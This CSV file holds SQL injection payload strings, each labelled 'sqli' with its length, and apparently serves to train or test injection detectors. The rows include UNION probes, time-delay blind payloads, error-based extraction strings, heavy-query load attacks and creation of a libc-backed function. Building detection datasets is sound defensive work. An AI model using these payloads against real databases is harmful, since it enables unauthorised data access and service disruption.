payload,length,attack_type
"1"" and elt(4249=4249,7259) and ""tmxx""=""tmxx",43,sqli
"1""));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((""uidb"" like ""uidb",123,sqli
"-5998%"") union all select 2366,2366,2366,2366#",46,sqli
"1"" and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",183,sqli
"1')) as babx where 2494=2494 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",126,sqli
1') waitfor delay '0:0:5' and ('peyv' like 'peyv,48,sqli
-2174')) as zhoz where 4185=4185 order by 1#,44,sqli
1')));(select * from (select(sleep(5)))srmq) and ((('jirc'='jirc,64,sqli
"-7683"") where 9664=9664 union all select 9664,9664,9664,9664,9664,9664,9664#",76,sqli
"1%"";select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""%""=""",96,sqli
"1'||(select 'dpje' where 2704=2704 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",172,sqli
"-4406%' union all select 9599,9599,9599,9599#",45,sqli
"1"")) and sleep(5)#",18,sqli
"1"" and 1668=8288",16,sqli
"-3566' where 3641=3641 union all select 3641,3641,3641,3641,3641#",65,sqli
"1'+(select dgnt where 4701=4701 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",107,sqli
1%')) and 6969=(select 6969 from pg_sleep(5)) and (('%'=',57,sqli
1%')));select case when 3995=8680 then 1 else null end--,56,sqli
"1%"") or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",106,sqli
"1""))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (((""yxpo"" like ""yxpo",119,sqli
-9688%')) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('%'=',201,sqli
"1%'))) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",105,sqli
"1""));select (case when (3565=4053) then 3565 else cast(1 as int)/(select 0 from dual) end) from dual--",102,sqli
"1"")) as qejm where 9014=9014 union all select null,null,null,null,null,null#",76,sqli
"-7501'+(select uloc where 3089=3089 union all select 3089,3089,3089,3089,3089,3089,3089,3089,3089,3089--",104,sqli
"1') as pfwt where 8448=8448 union all select null,null,null,null,null,null,null,null,null#",90,sqli
"1') where 4729=4729;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",80,sqli
"-9904"")) union all select 9080,9080,9080,9080,9080--",52,sqli
"1) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (1185=1185",106,sqli
"1'||(select 'hwyv' from dual where 1155=1155 and 8407=(select count(*) from generate_series(1,5000000)))||'",107,sqli
"1""));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((""wueo""=""wueo",138,sqli
"1"" and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ""eiuc"" like ""eiuc",114,sqli
"1' where 8749=8749 or 8421=(select count(*) from generate_series(1,5000000))--",78,sqli
"1"" or 8421=(select count(*) from generate_series(1,5000000)) and ""cdai""=""cdai",77,sqli
"1%"";select * from generate_series(3827,3827,case when (3827=7095) then 1 else 0 end) limit 1--",94,sqli
1'||(select 'gved' from dual where 6965=6965;waitfor delay '0:0:5')||',70,sqli
"-8841%"") or 4361=1910",21,sqli
"1'||(select 'ryyc' from dual where 5196=5196 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))||'",188,sqli
"1"") where 3826=3826;select count(*) from generate_series(1,5000000)--",69,sqli
"1'))) and 3824=benchmark(5000000,md5(0x76555642)) and ((('zurf'='zurf",69,sqli
"-8258"")) as swjp where 2681=2681 union all select 2681,2681,2681,2681,2681,2681--",81,sqli
1'))) waitfor delay '0:0:5' and ((('clcf'='clcf,47,sqli
"1%"");select pg_sleep(5) and (""%""=""",34,sqli
"1',(case when 5204=2136 then 1 else null end)",45,sqli
1) and sleep(5) and (4855=4855,30,sqli
1))) or (select * from (select(sleep(5)))sddo)#,47,sqli
1 or (select * from (select(sleep(5)))ydpu)# lwfs,49,sqli
"1%')) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (('%'='",125,sqli
1) as crsd where 5271=5271 waitfor delay '0:0:5'--,50,sqli
"1"")) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",145,sqli
"1%'));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (('%'='",132,sqli
"1"" and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",78,sqli
"1'))) or 8421=(select count(*) from generate_series(1,5000000)) and ((('tfnb'='tfnb",83,sqli
1'));(select * from (select(sleep(5)))srmq) and (('stea'='stea,62,sqli
"1)) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((8554=8554",93,sqli
-4892%')) or 2251=9881--,24,sqli
1) as qgsb where 7600=7600 and 2006=2006,40,sqli
"1' where 1893=1893 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",126,sqli
1%';select case when 4656=3716 then 1 else null end--,53,sqli
-3956') or (8459=8459)*4906 and ('rflo' like 'rflo,50,sqli
"1"" where 6179=6179;begin user_lock.sleep(5); end--",50,sqli
"1"";select benchmark(5000000,md5(0x4c4d6142))",44,sqli
"1))) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",112,sqli
"-4653' or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",137,sqli
1'));select sleep(5)#,21,sqli
"1)));iif(5257=5257,1,1/0)",25,sqli
"1%"" and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",99,sqli
"1"") where 6072=6072 and 2388=benchmark(5000000,md5(0x6d457153))#",64,sqli
1')));select pg_sleep(5) and ((('xobx'='xobx,44,sqli
1'+(select 'hcqf' where 9956=9956 and (2993=4297)*4297)+',57,sqli
"1')(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ('sstt'='sstt",207,sqli
"1"")) as jebl where 3464=3464;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",119,sqli
"-5513""))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (((""ovmk"" like ""ovmk",220,sqli
"1""))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (((""rtzn""=""rtzn",99,sqli
"1%' or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",98,sqli
1' in boolean mode) and 4595=4595#,34,sqli
1');begin dbms_lock.sleep(5); end,33,sqli
"1"")) as sgln where 7573=7573;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",137,sqli
1'+(select 'wyed' where 9896=9896;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,117,sqli
"-9295))) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((8752=8752",220,sqli
"-5572"") union all select 8131,8131#",35,sqli
"-8902 union all select 4339,4339,4339#",38,sqli
"1')) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('dhwt'='dhwt",119,sqli
"1%')));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((('%'='",101,sqli
"-6067'+(select 'bfhf' where 3114=3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",96,sqli
1' and (3020=3020)*6703 and 'tmng' like 'tmng,45,sqli
1) as mtda where 3951=3951;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,120,sqli
"1 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)# tcrm",111,sqli
"1"") as uyns where 4751=4751 and (select * from (select(sleep(5)))fzno)--",72,sqli
"-4121%"") union all select 2659,2659,2659,2659,2659,2659,2659,2659--",67,sqli
1 where 3354=3354;begin user_lock.sleep(5); end--,49,sqli
"1"")) as yfpl where 4820=4820 union all select null,null,null,null,null,null,null--",82,sqli
1'||(select 'ubza' where 2576=2576;select (case when (4341=7041) then 4341 else 4341*(select 4341 from mysql.db) end)#,118,sqli
-4775') or 3038=3038,20,sqli
"1%"" rlike (select * from (select(sleep(5)))sgvo) and ""%""=""",58,sqli
"-5247"" union all select 3097,3097,3097,3097,3097,3097,3097#",59,sqli
"-4605"") union all select 8542,8542,8542,8542,8542,8542,8542,8542--",66,sqli
"1'+(select sfuq where 8094=8094 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1))+'",124,sqli
"1) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)",203,sqli
"(select * from generate_series(3906,3906,case when (3906=3906) then 1 else 0 end) limit 1)",90,sqli
"1'+(select luwn where 1214=1214 union all select null,null,null,null,null,null#",79,sqli
"1%"")));iif(5257=5257,1,1/0)",27,sqli
"1')) as eleh where 1347=1347 or 8421=(select count(*) from generate_series(1,5000000))--",88,sqli
"1"")(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (""mrsl""=""mrsl",207,sqli
1'))) rlike sleep(5) and ((('svuu'='svuu,40,sqli
"1%"";select sleep(5) and ""%""=""",29,sqli
"1 and make_set(8403=8403,8899)# zysq",36,sqli
"1) as ujjg where 3125=3125 union all select null,null,null,null,null,null#",74,sqli
"1' where 6533=6533;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",106,sqli
"1');select count(*) from generate_series(1,5000000)--",53,sqli
"1"") where 6671=6671 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",128,sqli
"-7139"") where 2723=2723 or 3900=5082--",38,sqli
"1"") or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (""ngnd"" like ""ngnd",227,sqli
"-3475"" or elt(5532=4242,4242)",29,sqli
-7746'))) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('itxy' like 'itxy,265,sqli
"1'||(select 'ctgs' where 6809=6809 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",96,sqli
"1%'))) or elt(5873=5873,sleep(5))#",34,sqli
"1 where 7158=7158 or elt(5873=5873,sleep(5))#",45,sqli
"1""))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((""wwaq""=""wwaq",257,sqli
"1"") where 2016=2016 and (1547=2093)*2093--",42,sqli
1) as bzuh where 8041=8041 and 6307=9200#,41,sqli
1'))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('kkgt'='kkgt,206,sqli
"-2959"" union all select 3414,3414,3414,3414,3414,3414,3414,3414#",64,sqli
"1;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)# cdjm",106,sqli
1) where 5025=5025;begin user_lock.sleep(5); end--,50,sqli
"1')) as bedq where 8781=8781 or 8466=benchmark(5000000,md5(0x694a4745))--",73,sqli
"1')) as dipp where 1714=1714;select benchmark(5000000,md5(0x714e4153))#",71,sqli
"-6200' where 9150=9150 union all select 9150,9150,9150,9150,9150,9150,9150#",75,sqli
"1))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (((3977=3977",124,sqli
"-4543"") or 3038=3038",20,sqli
1%'));waitfor delay '0:0:5'--,29,sqli
1));select (case when (9696=2874) then 1 else 9696*(select 9696 from master..sysdatabases) end)--,97,sqli
-1252') or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('pzxh' like 'pzxh,232,sqli
"-9856"" union all select 9753--",30,sqli
"1') or 8466=benchmark(5000000,md5(0x694a4745))",46,sqli
(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (7992=7992) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)),179,sqli
"-5014%""))) or 3348=2430--",25,sqli
"1"")) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ((""oxvs"" like ""oxvs",136,sqli
"1"")) as hace where 8785=8785;begin user_lock.sleep(5); end--",60,sqli
"1%'))) and elt(1210=1210,sleep(5)) and ((('%'='",47,sqli
"1 where 1992=1992 union all select null,null--",46,sqli
-1769 union all select 6054--,29,sqli
1%';if(7899=7899) select 7899 else drop function zbbp--,55,sqli
"1 where 2031=2031 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",169,sqli
"1%"")) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((""%""=""",91,sqli
"1"");select sleep(5) and (""tlbj"" like ""tlbj",42,sqli
1 union all select null--,25,sqli
"1');select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ('qomf' like 'qomf",108,sqli
"1 where 9869=9869 union all select null,null#",45,sqli
"1') and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",199,sqli
"1',(select (case when (8382=8382) then 1 else 1/(select 0) end))",64,sqli
"1 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",197,sqli
"1"" or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)",93,sqli
-6144') or 9385=2474--,22,sqli
"1""))) or 6793=(select 6793 from pg_sleep(5)) and (((""azmf""=""azmf",64,sqli
"1')) as myws where 5274=5274;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",113,sqli
"1%"")) and make_set(8403=8403,8899) and ((""%""=""",46,sqli
"1"" or 6793=(select 6793 from pg_sleep(5)) and ""pwwb"" like ""pwwb",63,sqli
1'))) and 7401=9838#,20,sqli
"1%' (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and '%'='",211,sqli
"1"")) or (select * from (select(sleep(5)))ydpu) and ((""knbx""=""knbx",65,sqli
"1%' union all select null,null#",31,sqli
"1') where 7322=7322 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",118,sqli
"1"") rlike sleep(5) and (""rfsd""=""rfsd",36,sqli
"1' procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and 'ctac' like 'ctac",154,sqli
"1"");select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",97,sqli
"-5857%"")) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""%""=""",216,sqli
"-3971%'))) or elt(1032=1032,3623) and ((('%'='",46,sqli
"1""))) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (((""prtf"" like ""prtf",217,sqli
"1 and elt(3114=3114,sleep(5))#",30,sqli
"-1600%""))) or elt(4568=7693,7693) and (((""%""=""",46,sqli
"1')) as clhk where 4607=4607 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",200,sqli
"-1184""))) union all select 1482--",33,sqli
-5229')) as tkqp where 9253=9253 or 9323=9323#,46,sqli
"1"") where 9499=9499;(select * from (select(sleep(5)))acdk)#",59,sqli
"1%')) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (('%'='",120,sqli
1) where 1929=1929 and (select * from (select(sleep(5)))fzno)--,63,sqli
1)) as xoch where 8765=8765 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,261,sqli
1'||(select 'ydvg' from dual where 7108=7108;select sleep(5)#,61,sqli
"1');create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ('labj'='labj",136,sqli
